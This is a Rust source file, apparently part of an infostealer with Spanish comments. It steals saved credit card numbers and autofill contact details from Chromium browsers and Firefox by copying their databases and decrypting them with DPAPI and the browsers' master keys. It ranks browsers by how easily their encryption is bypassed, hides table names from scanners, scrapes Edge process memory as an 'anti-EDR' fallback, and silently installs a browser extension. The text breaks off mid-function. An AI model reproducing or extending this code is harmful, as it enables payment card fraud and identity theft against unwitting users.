// Stealer de tarjetas de crédito y autofill data de browsers
use crate::stealer::common::get_appdata_local;
use crate::stealer::chromium::{decrypt_value_dpapi, extract_master_key, decrypt_aes_gcm_bytes_debug};
use rusqlite::Connection;
use std::path::PathBuf;
use obfstr::obfstr;
use base64::{Engine as _, engine::general_purpose};

/// Tarjeta de crédito robada
#[derive(Debug, Clone)]
pub struct CreditCard {
    pub browser: String,
    pub name_on_card: String,
    pub card_number: String,
    pub expiration_month: i32,
    pub expiration_year: i32,
    pub billing_address: Option<String>,
    pub nickname: Option<String>,
}

impl CreditCard {
    pub fn to_string(&self) -> String {
        let mut output = format!("[{}]\n", self.browser);
        output.push_str(&format!("Name: {}\n", self.name_on_card));
        output.push_str(&format!("Card: {}\n", self.card_number));
        output.push_str(&format!("Expiration: {:02}/{}\n", self.expiration_month, self.expiration_year));
        
        if let Some(ref nickname) = self.nickname {
            if !nickname.is_empty() {
                output.push_str(&format!("Nickname: {}\n", nickname));
            }
        }
        
        if let Some(ref address) = self.billing_address {
            if !address.is_empty() {
                output.push_str(&format!("Billing Address: {}\n", address));
            }
        }
        
        output
    }
}

/// Dirección de autofill robada
#[derive(Debug, Clone)]
pub struct AutofillAddress {
    pub browser: String,
    pub name: Option<String>,
    pub email: Option<String>,
    pub phone: Option<String>,
    pub street_address: Option<String>,
    pub city: Option<String>,
    pub state: Option<String>,
    pub zip_code: Option<String>,
    pub country: Option<String>,
}

impl AutofillAddress {
    pub fn to_string(&self) -> String {
        let mut output = format!("[{}]\n", self.browser);
        
        if let Some(ref name) = self.name {
            if !name.is_empty() {
                output.push_str(&format!("Name: {}\n", name));
            }
        }
        
        if let Some(ref email) = self.email {
            if !email.is_empty() {
                output.push_str(&format!("Email: {}\n", email));
            }
        }
        
        if let Some(ref phone) = self.phone {
            if !phone.is_empty() {
                output.push_str(&format!("Phone: {}\n", phone));
            }
        }
        
        // Construir dirección completa
        let mut address_parts = Vec::new();
        
        if let Some(ref street) = self.street_address {
            if !street.is_empty() {
                address_parts.push(street.clone());
            }
        }
        
        if let Some(ref city) = self.city {
            if !city.is_empty() {
                address_parts.push(city.clone());
            }
        }
        
        if let Some(ref state) = self.state {
            if !state.is_empty() {
                address_parts.push(state.clone());
            }
        }
        
        if let Some(ref country) = self.country {
            if !country.is_empty() {
                address_parts.push(country.clone());
            }
        }
        
        if let Some(ref zip) = self.zip_code {
            if !zip.is_empty() {
                address_parts.push(zip.clone());
            }
        }
        
        if !address_parts.is_empty() {
            output.push_str(&format!("Address: {}\n", address_parts.join(", ")));
        }
        
        output
    }
}

/// Configuración de browser para robo de autofill
struct BrowserConfig {
    name: &'static str,
    web_data_path: &'static str,
    priority: u8,  // 1 = máxima prioridad (sin v20), 5 = mínima (v20 activo)
}

// REORDENADO: Priorizar navegadores SIN App-Bound Encryption (v20)
const BROWSERS: &[BrowserConfig] = &[
    // ✅ PRIORIDAD ALTA: Sin v20, 100% bypasseable
    BrowserConfig {
        name: "Brave",
        web_data_path: r"BraveSoftware\Brave-Browser\User Data\Default\Web Data",
        priority: 1,
    },
    BrowserConfig {
        name: "Opera",
        web_data_path: r"Opera Software\Opera Stable\Web Data",
        priority: 1,
    },
    BrowserConfig {
        name: "Opera GX",
        web_data_path: r"Opera Software\Opera GX Stable\Web Data",
        priority: 1,
    },
    BrowserConfig {
        name: "Vivaldi",
        web_data_path: r"Vivaldi\User Data\Default\Web Data",
        priority: 1,
    },
    BrowserConfig {
        name: "Arc",
        web_data_path: r"Arc\User Data\Default\Web Data",
        priority: 1,
    },
    // ⚠️ PRIORIDAD MEDIA: Chrome (~45% sin v20)
    BrowserConfig {
        name: "Chrome",
        web_data_path: r"Google\Chrome\User Data\Default\Web Data",
        priority: 3,
    },
    // 🔴 PRIORIDAD BAJA: Edge (~95% con v20)
    BrowserConfig {
        name: "Edge",
        web_data_path: r"Microsoft\Edge\User Data\Default\Web Data",
        priority: 5,
    },
];

/// Roba tarjetas de crédito de todos los browsers
pub fn steal_credit_cards() -> Vec<CreditCard> {
    let mut all_cards = Vec::new();
    
    // 🔍 DEBUG: Log file
    let debug_log = std::env::temp_dir().join("stealer_debug.txt");
    let mut log = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&debug_log)
        .ok();
    
    if let Some(ref mut f) = log {
        use std::io::Write;
        let _ = writeln!(f, "\n=== STEAL_CREDIT_CARDS INICIADO ===");
    }
    
    for browser in BROWSERS {
        if let Some(ref mut f) = log {
            use std::io::Write;
            let _ = writeln!(f, "Intentando browser: {}", browser.name);
        }
        
        if let Some(mut cards) = steal_credit_cards_from_browser(browser) {
            if let Some(ref mut f) = log {
                use std::io::Write;
                let _ = writeln!(f, "  ✅ {} tarjetas encontradas en {}", cards.len(), browser.name);
            }
            all_cards.append(&mut cards);
        } else {
            if let Some(ref mut f) = log {
                use std::io::Write;
                let _ = writeln!(f, "  ❌ No se encontraron tarjetas en {}", browser.name);
            }
        }
        
        // 🔍 DEBUG: Buscar en perfiles adicionales (Profile 1, Profile 2, etc.)
        if browser.name == "Edge" || browser.name == "Chrome" {
            if let Some(local_appdata) = get_appdata_local() {
                let browser_dir = if browser.name == "Edge" {
                    local_appdata.join(r"Microsoft\Edge\User Data")
                } else {
                    local_appdata.join(r"Google\Chrome\User Data")
                };
                
                // Buscar en Profile 1, Profile 2, etc.
                for i in 1..=5 {
                    let profile_name = format!("Profile {}", i);
                    let profile_path = browser_dir.join(&profile_name).join("Web Data");
                    
                    if profile_path.exists() {
                        if let Some(temp_path) = copy_to_temp(&profile_path) {
                            let mut profile_cards = extract_credit_cards(&temp_path, &format!("{} ({})", browser.name, profile_name), None);
                            all_cards.append(&mut profile_cards);
                            std::fs::remove_file(&temp_path).ok();
                        }
                    }
                }
            }
        }
    }
    
    all_cards
}

/// Roba tarjetas de crédito de un browser específico
fn steal_credit_cards_from_browser(browser: &BrowserConfig) -> Option<Vec<CreditCard>> {
    let local_appdata = get_appdata_local()?;
    let web_data_path = local_appdata.join(browser.web_data_path);
    
    if !web_data_path.exists() {
        return None;
    }
    
    // Extraer master key de Local State para v10/v11/v20 (AES-GCM)
    let master_key = if browser.name == "Chrome" || browser.name == "Edge" || browser.name == "Brave" {
        let local_state_path = if browser.name == "Edge" {
            local_appdata.join(r"Microsoft\Edge\User Data\Local State")
        } else if browser.name == "Chrome" {
            local_appdata.join(r"Google\Chrome\User Data\Local State")
        } else {
            local_appdata.join(r"BraveSoftware\Brave-Browser\User Data\Local State")
        };
        
        extract_master_key(&local_state_path).ok().flatten()
    } else {
        None
    };
    
    // Copiar base de datos a temp (porque puede estar bloqueada)
    let temp_path = copy_to_temp(&web_data_path)?;
    
    let cards = extract_credit_cards(&temp_path, browser.name, master_key.as_deref());
    
    // Eliminar archivo temporal
    std::fs::remove_file(&temp_path).ok();
    
    Some(cards)
}

/// Extrae tarjetas de crédito de la base de datos Web Data
fn extract_credit_cards(db_path: &PathBuf, browser_name: &str, master_key: Option<&[u8]>) -> Vec<CreditCard> {
    let mut cards = Vec::new();
    
    // 🔍 DEBUG: Log file
    let debug_log = std::env::temp_dir().join("stealer_debug.txt");
    let mut log = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&debug_log)
        .ok();
    
    if let Some(ref mut f) = log {
        use std::io::Write;
        let _ = writeln!(f, "    Extrayendo tarjetas de: {}", browser_name);
        let _ = writeln!(f, "    DB Path: {:?}", db_path);
        let _ = writeln!(f, "    Master key disponible: {}", master_key.is_some());
    }
    
    let conn = match Connection::open(db_path) {
        Ok(c) => {
            if let Some(ref mut f) = log {
                use std::io::Write;
                let _ = writeln!(f, "    ✅ DB abierta correctamente");
            }
            c
        },
        Err(e) => {
            if let Some(ref mut f) = log {
                use std::io::Write;
                let _ = writeln!(f, "    ❌ Error abriendo DB: {}", e);
            }
            return cards;
        }
    };
    
    // Query para obtener tarjetas y direcciones
    let query = format!("
        SELECT 
            name_on_card,
            expiration_month,
            expiration_year,
            card_number_encrypted,
            billing_address_id,
            nickname
        FROM {}
    ", obfstr!("credit_cards"));
    
    if let Some(ref mut f) = log {
        use std::io::Write;
        let _ = writeln!(f, "    Ejecutando query...");
    }
    
    let mut stmt = match conn.prepare(&query) {
        Ok(s) => {
            if let Some(ref mut f) = log {
                use std::io::Write;
                let _ = writeln!(f, "    ✅ Query preparado correctamente");
            }
            s
        },
        Err(e) => {
            if let Some(ref mut f) = log {
                use std::io::Write;
                let _ = writeln!(f, "    ❌ Error preparando query: {}", e);
            }
            return cards;
        }
    };
    
    let card_iter = stmt.query_map([], |row| {
        Ok((
            row.get::<_, String>(0)?,      // name_on_card
            row.get::<_, i32>(1)?,          // expiration_month
            row.get::<_, i32>(2)?,          // expiration_year
            row.get::<_, Vec<u8>>(3)?,      // card_number_encrypted
            row.get::<_, Option<String>>(4)?, // billing_address_id
            row.get::<_, Option<String>>(5)?, // nickname
        ))
    });
    
    if let Ok(iter) = card_iter {
        if let Some(ref mut f) = log {
            use std::io::Write;
            let _ = writeln!(f, "    Iterando sobre resultados...");
        }
        
        let mut count = 0;
        for card_result in iter {
            count += 1;
            if let Some(ref mut f) = log {
                use std::io::Write;
                let _ = writeln!(f, "    Registro #{}", count);
            }
            
            if let Ok((name, exp_month, exp_year, encrypted_number, billing_id, nickname)) = card_result {
                if let Some(ref mut f) = log {
                    use std::io::Write;
                    let _ = writeln!(f, "      Nombre: {}", name);
                    let _ = writeln!(f, "      Exp: {}/{}", exp_month, exp_year);
                    let _ = writeln!(f, "      Encrypted bytes: {}", encrypted_number.len());
                    
                    // Mostrar primeros bytes en hexadecimal para diagnóstico
                    if encrypted_number.len() > 0 {
                        let preview_len = std::cmp::min(20, encrypted_number.len());
                        let _ = write!(f, "      Primeros bytes (hex): ");
                        for i in 0..preview_len {
                            let _ = write!(f, "{:02X} ", encrypted_number[i]);
                        }
                        let _ = writeln!(f, "");
                        
                        // Verificar formato (v10/v11/v20 = AES-GCM, sin prefijo = DPAPI directo)
                        if encrypted_number.len() >= 3 {
                            if &encrypted_number[0..3] == b"v10" {
                                let _ = writeln!(f, "      ⚠️ Formato: v10 (AES-256-GCM) - Necesita master key");
                            } else if &encrypted_number[0..3] == b"v11" {
                                let _ = writeln!(f, "      ⚠️ Formato: v11 (AES-256-GCM) - Necesita master key");
                            } else if &encrypted_number[0..3] == b"v20" {
                                let _ = writeln!(f, "      ⚠️ Formato: v20 (AES-256-GCM MODERNO) - Necesita master key");
                            } else if encrypted_number.len() >= 5 && &encrypted_number[0..5] == b"DPAPI" {
                                let _ = writeln!(f, "      ℹ️ Formato: DPAPI con prefijo");
                            } else {
                                let _ = writeln!(f, "      ℹ️ Formato: DPAPI directo (raw bytes)");
                            }
                        }
                    }
                }
                
                // Intentar desencriptar
                let mut decrypted_bytes: Option<Vec<u8>> = None;
                
                // 1. Intentar AES-256-GCM si tenemos master key y es formato v10/v11/v20
                if let Some(key) = master_key {
                    if encrypted_number.len() >= 3 {
                        let prefix = &encrypted_number[0..3];
                        if prefix == b"v10" || prefix == b"v11" || prefix == b"v20" {
                            if let Some(ref mut f) = log {
                                use std::io::Write;
                                let _ = writeln!(f, "      🔑 Intentando AES-256-GCM con master key...");
                                let _ = writeln!(f, "      📊 Total bytes encriptados: {}", encrypted_number.len());
                                let _ = writeln!(f, "      📊 Master key length: {}", key.len());
                                
                                // Mostrar primeros bytes de master key (solo para debug)
                                let _ = write!(f, "      🔑 Master key (primeros 16 bytes): ");
                                for i in 0..std::cmp::min(16, key.len()) {
                                    let _ = write!(f, "{:02X} ", key[i]);
                                }
                                let _ = writeln!(f, "");
                                
                                let _ = writeln!(f, "      📊 Prefix: {:02X} {:02X} {:02X} ({})", 
                                    prefix[0], prefix[1], prefix[2], 
                                    String::from_utf8_lossy(prefix));
                                
                                if encrypted_number.len() >= 15 {
                                    let nonce_bytes = &encrypted_number[3..15];
                                    let ciphertext_with_tag = &encrypted_number[15..];
                                    let _ = writeln!(f, "      📊 Nonce length: {} bytes", nonce_bytes.len());
                                    
                                    // Mostrar nonce en hex
                                    let _ = write!(f, "      📊 Nonce (hex): ");
                                    for i in 0..nonce_bytes.len() {
                                        let _ = write!(f, "{:02X} ", nonce_bytes[i]);
                                    }
                                    let _ = writeln!(f, "");
                                    
                                    let _ = writeln!(f, "      📊 Ciphertext+Tag length: {} bytes", ciphertext_with_tag.len());
                                    let _ = writeln!(f, "      📊 Expected plaintext: {} bytes", ciphertext_with_tag.len().saturating_sub(16));
                                }
                            }
                            
                            // Usar versión debug para obtener más información
                            let (result, debug_log) = decrypt_aes_gcm_bytes_debug(&encrypted_number, key);
                            
                            if let Some(ref mut f) = log {
                                use std::io::Write;
                                let _ = write!(f, "{}", debug_log);
                            }
                            
                            if let Some(decrypted) = result {
                                if let Some(ref mut f) = log {
                                    use std::io::Write;
                                    let _ = writeln!(f, "      ✅ AES-256-GCM decrypt OK");
                                }
                                decrypted_bytes = Some(decrypted);
                            } else {
                                if let Some(ref mut f) = log {
                                    use std::io::Write;
                                    let _ = writeln!(f, "      ❌ AES-256-GCM decrypt failed");
                                }
                            }
                        }
                    }
                }
                
                // 2. Fallback a DPAPI si AES-GCM no funcionó
                if decrypted_bytes.is_none() {
                    if let Some(ref mut f) = log {
                        use std::io::Write;
                        let _ = writeln!(f, "      🔑 Intentando DPAPI...");
                    }
                    decrypted_bytes = decrypt_value_dpapi(&encrypted_number);
                }
                
                // Procesar bytes desencriptados
                if let Some(decrypted) = decrypted_bytes {
                    if let Some(ref mut f) = log {
                        use std::io::Write;
                        let _ = writeln!(f, "      ✅ Desencriptación exitosa, bytes: {}", decrypted.len());
                        
                        // Mostrar bytes desencriptados
                        if decrypted.len() > 0 {
                            let preview_len = std::cmp::min(30, decrypted.len());
                            let _ = write!(f, "      Decrypted bytes (hex): ");
                            for i in 0..preview_len {
                                let _ = write!(f, "{:02X} ", decrypted[i]);
                            }
                            let _ = writeln!(f, "");
                        }
                    }
                    
                    if let Ok(card_number) = String::from_utf8(decrypted.clone()) {
                        if let Some(ref mut f) = log {
                            use std::io::Write;
                            let _ = writeln!(f, "      ✅ UTF8 conversion OK: '{}'", card_number.replace(char::is_whitespace, ""));
                        }
                        
                        // Obtener dirección de billing si existe
                        let billing_address = if let Some(ref addr_id) = billing_id {
                            get_billing_address(&conn, addr_id)
                        } else {
                            None
                        };
                        
                        cards.push(CreditCard {
                            browser: browser_name.to_string(),
                            name_on_card: name,
                            card_number: format_card_number(&card_number),
                            expiration_month: exp_month,
                            expiration_year: exp_year,
                            billing_address,
                            nickname,
                        });
                        
                        if let Some(ref mut f) = log {
                            use std::io::Write;
                            let _ = writeln!(f, "      ✅ TARJETA AGREGADA!");
                        }
                    } else {
                        if let Some(ref mut f) = log {
                            use std::io::Write;
                            let _ = writeln!(f, "      ❌ UTF8 conversion failed - Bytes desencriptados no son texto válido");
                        }
                    }
                } else {
                    if let Some(ref mut f) = log {
                        use std::io::Write;
                        let _ = writeln!(f, "      ❌ Desencriptación fallida (AES-GCM y DPAPI)");
                        let _ = writeln!(f, "      💡 Posibles causas:");
                        let _ = writeln!(f, "         - Windows Defender bloqueando DPAPI");
                        let _ = writeln!(f, "         - Diferente usuario encriptó los datos");
                        let _ = writeln!(f, "         - Tarjeta protegida por Microsoft Account");
                        let _ = writeln!(f, "         - Master key incorrecta o no disponible");
                        let _ = writeln!(f, "         - Formato desconocido (no v10/v11/v20/DPAPI)");
                    }
                }
            } else {
                if let Some(ref mut f) = log {
                    use std::io::Write;
                    let _ = writeln!(f, "      ❌ Error parsing row");
                }
            }
        }
        
        if let Some(ref mut f) = log {
            use std::io::Write;
            let _ = writeln!(f, "    Total tarjetas extraídas: {}", cards.len());
        }
    } else {
        if let Some(ref mut f) = log {
            use std::io::Write;
            let _ = writeln!(f, "    ❌ Error ejecutando query");
        }
    }
    
    cards
}

/// Roba direcciones de autofill de todos los browsers
pub fn steal_autofill_addresses() -> Vec<AutofillAddress> {
    let mut all_addresses = Vec::new();
    
    for browser in BROWSERS {
        if let Some(mut addresses) = steal_autofill_from_browser(browser) {
            all_addresses.append(&mut addresses);
        }
        
        // 🔍 DEBUG: Buscar en perfiles adicionales (Profile 1, Profile 2, etc.)
        if browser.name == "Edge" || browser.name == "Chrome" {
            if let Some(local_appdata) = get_appdata_local() {
                let browser_dir = if browser.name == "Edge" {
                    local_appdata.join(r"Microsoft\Edge\User Data")
                } else {
                    local_appdata.join(r"Google\Chrome\User Data")
                };
                
                // Buscar en Profile 1, Profile 2, etc.
                for i in 1..=5 {
                    let profile_name = format!("Profile {}", i);
                    let profile_path = browser_dir.join(&profile_name).join("Web Data");
                    
                    if profile_path.exists() {
                        if let Some(temp_path) = copy_to_temp(&profile_path) {
                            let mut profile_addresses = extract_autofill_addresses(&temp_path, &format!("{} ({})", browser.name, profile_name));
                            all_addresses.append(&mut profile_addresses);
                            std::fs::remove_file(&temp_path).ok();
                        }
                    }
                }
            }
        }
    }
    
    all_addresses
}

/// Roba direcciones de autofill de un browser específico
fn steal_autofill_from_browser(browser: &BrowserConfig) -> Option<Vec<AutofillAddress>> {
    let local_appdata = get_appdata_local()?;
    let web_data_path = local_appdata.join(browser.web_data_path);
    
    if !web_data_path.exists() {
        return None;
    }
    
    let temp_path = copy_to_temp(&web_data_path)?;
    let addresses = extract_autofill_addresses(&temp_path, browser.name);
    std::fs::remove_file(&temp_path).ok();
    
    Some(addresses)
}

/// Extrae direcciones de autofill de Web Data
fn extract_autofill_addresses(db_path: &PathBuf, browser_name: &str) -> Vec<AutofillAddress> {
    let mut addresses = Vec::new();
    
    let conn = match Connection::open(db_path) {
        Ok(c) => c,
        Err(_) => return addresses,
    };
    
    // Query para obtener perfiles de autofill
    let table_name = obfstr!("autofill_profile_addresses").to_string();
    let query = format!("
        SELECT 
            guid,
            street_address,
            city,
            state,
            zipcode,
            country_code
        FROM {}
    ", table_name);
    
    let mut stmt = match conn.prepare(&query) {
        Ok(s) => s,
        Err(_) => return addresses,
    };
    
    let addr_iter = stmt.query_map([], |row| {
        Ok((
            row.get::<_, String>(0)?,           // guid
            row.get::<_, Option<String>>(1)?,   // street_address
            row.get::<_, Option<String>>(2)?,   // city
            row.get::<_, Option<String>>(3)?,   // state
            row.get::<_, Option<String>>(4)?,   // zipcode
            row.get::<_, Option<String>>(5)?,   // country_code
        ))
    });
    
    if let Ok(iter) = addr_iter {
        for addr_result in iter {
            if let Ok((guid, street, city, state, zip, country)) = addr_result {
                // Obtener nombre, email y teléfono asociados al perfil
                let (name, email, phone) = get_profile_contact_info(&conn, &guid);
                
                addresses.push(AutofillAddress {
                    browser: browser_name.to_string(),
                    name,
                    email,
                    phone,
                    street_address: street,
                    city,
                    state,
                    zip_code: zip,
                    country,
                });
            }
        }
    }
    
    addresses
}

/// Obtiene información de contacto del perfil (nombre, email, teléfono)
fn get_profile_contact_info(conn: &Connection, guid: &str) -> (Option<String>, Option<String>, Option<String>) {
    let mut name = None;
    let mut email = None;
    let mut phone = None;
    
    // Obtener nombre
    let name_query = format!("SELECT full_name FROM {} WHERE guid = ?", obfstr!("autofill_profile_names"));
    if let Ok(mut stmt) = conn.prepare(&name_query) {
        if let Ok(result) = stmt.query_row([guid], |row| row.get::<_, String>(0)) {
            name = Some(result);
        }
    }
    
    // Obtener email
    let email_query = format!("SELECT email FROM {} WHERE guid = ?", obfstr!("autofill_profile_emails"));
    if let Ok(mut stmt) = conn.prepare(&email_query) {
        if let Ok(result) = stmt.query_row([guid], |row| row.get::<_, String>(0)) {
            email = Some(result);
        }
    }
    
    // Obtener teléfono
    let phone_query = format!("SELECT number FROM {} WHERE guid = ?", obfstr!("autofill_profile_phones"));
    if let Ok(mut stmt) = conn.prepare(&phone_query) {
        if let Ok(result) = stmt.query_row([guid], |row| row.get::<_, String>(0)) {
            phone = Some(result);
        }
    }
    
    (name, email, phone)
}

/// Obtiene la dirección de billing asociada a una tarjeta
fn get_billing_address(conn: &Connection, address_id: &str) -> Option<String> {
    let table_name = obfstr!("autofill_profile_addresses").to_string();
    let query = format!("
        SELECT 
            street_address,
            city,
            state,
            zipcode,
            country_code
        FROM {}
        WHERE guid = ?
    ", table_name);
    
    if let Ok(mut stmt) = conn.prepare(&query) {
        if let Ok((street, city, state, zip, country)) = stmt.query_row([address_id], |row| {
            Ok((
                row.get::<_, Option<String>>(0)?,
                row.get::<_, Option<String>>(1)?,
                row.get::<_, Option<String>>(2)?,
                row.get::<_, Option<String>>(3)?,
                row.get::<_, Option<String>>(4)?,
            ))
        }) {
            let mut parts = Vec::new();
            
            if let Some(s) = street { if !s.is_empty() { parts.push(s); } }
            if let Some(c) = city { if !c.is_empty() { parts.push(c); } }
            if let Some(st) = state { if !st.is_empty() { parts.push(st); } }
            if let Some(co) = country { if !co.is_empty() { parts.push(co); } }
            if let Some(z) = zip { if !z.is_empty() { parts.push(z); } }
            
            if !parts.is_empty() {
                return Some(parts.join(", "));
            }
        }
    }
    
    None
}

/// Copia base de datos a archivo temporal
fn copy_to_temp(db_path: &PathBuf) -> Option<PathBuf> {
    let temp_dir = std::env::temp_dir();
    let temp_name = format!("webdata_{}.db", std::process::id());
    let temp_path = temp_dir.join(temp_name);
    
    std::fs::copy(db_path, &temp_path).ok()?;
    
    Some(temp_path)
}

/// Formatea número de tarjeta (agregar espacios cada 4 dígitos)
fn format_card_number(card_number: &str) -> String {
    let clean = card_number.chars().filter(|c| c.is_numeric()).collect::<String>();
    
    clean.chars()
        .collect::<Vec<char>>()
        .chunks(4)
        .map(|chunk| chunk.iter().collect::<String>())
        .collect::<Vec<String>>()
        .join(" ")
}

/// ═══════════════════════════════════════════════════════════
/// NUEVO: Función híbrida con Memory Injection Anti-EDR
/// ═══════════════════════════════════════════════════════════

use crate::stealer::memory_injection::{scan_all_edge_processes_for_cards, CreditCardData};

/// Estrategia híbrida para robar credit cards:
/// 1. Intenta método directo (DB + desencriptación)
/// 2. Si detecta v20, usa memory injection
/// 3. Instala extensión como fallback
pub fn steal_credit_cards_hybrid() -> Vec<CreditCard> {
    use std::io::Write;
    
    let mut all_cards = Vec::new();
    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
    let mut debug_file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&debug_path)
        .ok();
    
    let mut log = |msg: &str| {
        if let Some(ref mut file) = debug_file {
            let _ = writeln!(file, "{}", msg);
        }
    };
    
    log("\n═══ HYBRID CREDIT CARD THEFT ═══");
    
    // PASO 1: Intentar método tradicional Chromium (funciona con v10/v11)
    log("🔸 PASO 1: Intentando método tradicional (DB + decrypt)...");
    let traditional_cards = steal_credit_cards();
    all_cards.extend(traditional_cards.clone());
    log(&format!("  ✅ Encontradas {} tarjetas con método tradicional (Chromium)", traditional_cards.len()));
    
    // PASO 1.5: Firefox (sistema independiente, siempre funciona)
    log("🔸 PASO 1.5: Intentando Firefox...");
    let firefox_cards = steal_firefox_credit_cards();
    all_cards.extend(firefox_cards.clone());
    log(&format!("  ✅ Encontradas {} tarjetas en Firefox", firefox_cards.len()));
    
    // PASO 2: Si encontramos v20 bloqueado en Chromium, usar memory injection
    if traditional_cards.is_empty() || has_v20_encrypted_cards() {
        log("🔸 PASO 2: v20 detectado → Usando Memory Injection Anti-EDR...");
        
        match steal_via_memory_injection() {
            Ok(memory_cards) => {
                log(&format!("  ✅ Encontradas {} tarjetas en memoria", memory_cards.len()));
                all_cards.extend(memory_cards);
            },
            Err(e) => {
                log(&format!("  ❌ Memory injection failed: {}", e));
            }
        }
    } else {
        log("🔸 PASO 2: Saltando memory injection (tarjetas ya obtenidas)");
    }
    
    // PASO 3: Si aún no hay tarjetas, instalar extensión (fallback)
    if all_cards.is_empty() {
        log("🔸 PASO 3: Instalando extensión como fallback...");
        match install_extension_stealth() {
            Ok(_) => log("  ✅ Extensión instalada exitosamente"),
            Err(e) => log(&format!("  ❌ Extension install failed: {}", e)),
        }
    } else {
        log("🔸 PASO 3: Saltando extensión (tarjetas ya obtenidas)");
    }
    
    log(&format!("\n🎯 TOTAL FINAL: {} tarjetas robadas", all_cards.len()));
    log("════════════════════════════════\n");
    
    all_cards
}

/// Verifica si hay tarjetas encriptadas con v20 en la DB
fn has_v20_encrypted_cards() -> bool {
    // Revisar si alguna tarjeta tiene el formato v20
    // (esto lo podemos detectar en los logs previos)
    // Por ahora, asumimos que sí si no encontramos tarjetas
    true
}

/// Roba credit cards usando memory injection anti-EDR (MULTI-PROCESO)
fn steal_via_memory_injection() -> Result<Vec<CreditCard>, String> {
    use std::io::Write;
    
    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
    let mut debug_file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&debug_path)
        .ok();
    
    let mut log = |msg: &str| {
        if let Some(ref mut file) = debug_file {
            let _ = writeln!(file, "{}", msg);
        }
    };
    
    let mut cards = Vec::new();
    
    log("\n  🔍 Iniciando Memory Injection Multi-Proceso...");
    
    // Escanear TODOS los procesos msedge.exe (main + renderers)
    log("  🔍 Buscando TODOS los procesos msedge.exe...");
    let memory_cards = scan_all_edge_processes_for_cards();
    
    if memory_cards.is_empty() {
        log("  ❌ No se encontraron tarjetas en ningún proceso Edge");
        return Err("No cards found in Edge memory".to_string());
    }
    
    log(&format!("  ✅ Encontradas {} tarjetas en memoria", memory_cards.len()));
    
    // Convertir formato
    for (idx, mem_card) in memory_cards.iter().enumerate() {
        log(&format!("    Card #{}: {} (exp: {}/{})", 
            idx + 1,
            mem_card.card_number,
            mem_card.expiry_month.unwrap_or(0),
            mem_card.expiry_year.unwrap_or(0)
        ));
        
        cards.push(CreditCard {
            browser: "Edge (Memory)".to_string(),
            name_on_card: mem_card.cardholder_name.clone().unwrap_or_default(),
            card_number: mem_card.card_number.clone(),
            expiration_month: mem_card.expiry_month.unwrap_or(0) as i32,
            expiration_year: mem_card.expiry_year.unwrap_or(0) as i32,
            billing_address: None,
            nickname: None,
        });
    }
    
    Ok(cards)
}

/// Instala extensión de forma stealth (sin interacción del usuario)
fn install_extension_stealth() -> Result<(), String> {
    use crate::stealer::extension_installer::ExtensionInstaller;
    use std::env;
    
    // Obtener ruta de la extensión empaquetada
    let current_dir = env::current_dir()
        .map_err(|_| "Failed to get current dir")?;
    
    let extension_path = current_dir
        .join("chromium-extension");
    
    if !extension_path.exists() {
        return Err("Extension not found".to_string());
    }
    
    // Instalar en todos los browsers Chromium
    let installer = ExtensionInstaller::new(extension_path);
    
    let _ = installer.install_edge();
    let _ = installer.install_chrome();
    let _ = installer.install_brave();
    
    Ok(())
}

/// Roba tarjetas de crédito de Firefox
/// Firefox almacena tarjetas en: formautofill.sqlite (SQLite database)
pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
    use std::io::Write;
    
    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
    let mut debug_file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&debug_path)
        .ok();
    
    let mut log = |msg: &str| {
        if let Some(ref mut file) = debug_file {
            let _ = writeln!(file, "{}", msg);
        }
    };
    
    let mut cards = Vec::new();
    
    log("  🦊 [FIREFOX] Iniciando extracción de tarjetas...");
    
    // Firefox profiles: %APPDATA%\Mozilla\Firefox\Profiles\
    let appdata = match std::env::var("APPDATA") {
        Ok(path) => {
            log(&format!("  📂 APPDATA: {}", path));
            PathBuf::from(path)
        },
        Err(_) => {
            log("  ❌ APPDATA no encontrado");
            return cards;
        }
    };
    
    let firefox_profiles = appdata.join(r"Mozilla\Firefox\Profiles");
    
    log(&format!("  📂 Buscando perfiles en: {}", firefox_profiles.display()));
    
    if !firefox_profiles.exists() {
        log("  ❌ Directorio de perfiles no existe");
        return cards;
    }
    
    // Iterar sobre todos los perfiles
    if let Ok(entries) = std::fs::read_dir(&firefox_profiles) {
        log("  📂 Iterando sobre perfiles...");
        
        for entry in entries.flatten() {
            if entry.path().is_dir() {
                let profile_path = entry.path();
                log(&format!("  📁 Perfil: {}", profile_path.display()));
                
                // Firefox guarda credit cards en formautofill.sqlite
                let formautofill_db = profile_path.join("formautofill.sqlite");
                
                log(&format!("    🔍 Buscando DB: {}", formautofill_db.display()));
                
                if !formautofill_db.exists() {
                    log("    ⚠️  formautofill.sqlite NO EXISTE");
                    
                    // ALTERNATIVA 1: autofill-profiles.json (Firefox antiguo)
                    let json_path = profile_path.join("autofill-profiles.json");
                    log(&format!("    🔍 Buscando alternativa: {}", json_path.display()));
                    if json_path.exists() {
                        log("    ✅ autofill-profiles.json ENCONTRADO! Leyendo contenido...");
                        
                        // Leer archivo JSON
                        if let Ok(content) = std::fs::read_to_string(&json_path) {
                            log(&format!("    📄 Tamaño: {} bytes", content.len()));
                            
                            // Mostrar primeros 1000 caracteres
                            let preview: String = content.chars().take(1000).collect();
                            log(&format!("    � CONTENIDO:\n{}", preview));
                            
                            // Parse JSON
                            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
                                log("    ✅ JSON parseado correctamente");
                                
                                // Extraer creditCards array
                                if let Some(credit_cards) = json.get("creditCards").and_then(|v| v.as_array()) {
                                    log(&format!("    � Encontradas {} tarjetas en JSON", credit_cards.len()));
                                    
                                    for (idx, card_obj) in credit_cards.iter().enumerate() {
                                        log(&format!("    🔸 Procesando tarjeta #{}", idx + 1));
                                        
                                        let name = card_obj.get("cc-name")
                                            .and_then(|v| v.as_str())
                                            .unwrap_or("");
                                        
                                        let exp_month = card_obj.get("cc-exp-month")
                                            .and_then(|v| v.as_u64())
                                            .unwrap_or(0);
                                        
                                        let exp_year = card_obj.get("cc-exp-year")
                                            .and_then(|v| v.as_u64())
                                            .unwrap_or(0);
                                        
                                        let encrypted_number = card_obj.get("cc-number-encrypted")
                                            .and_then(|v| v.as_str())
                                            .unwrap_or("");
                                        
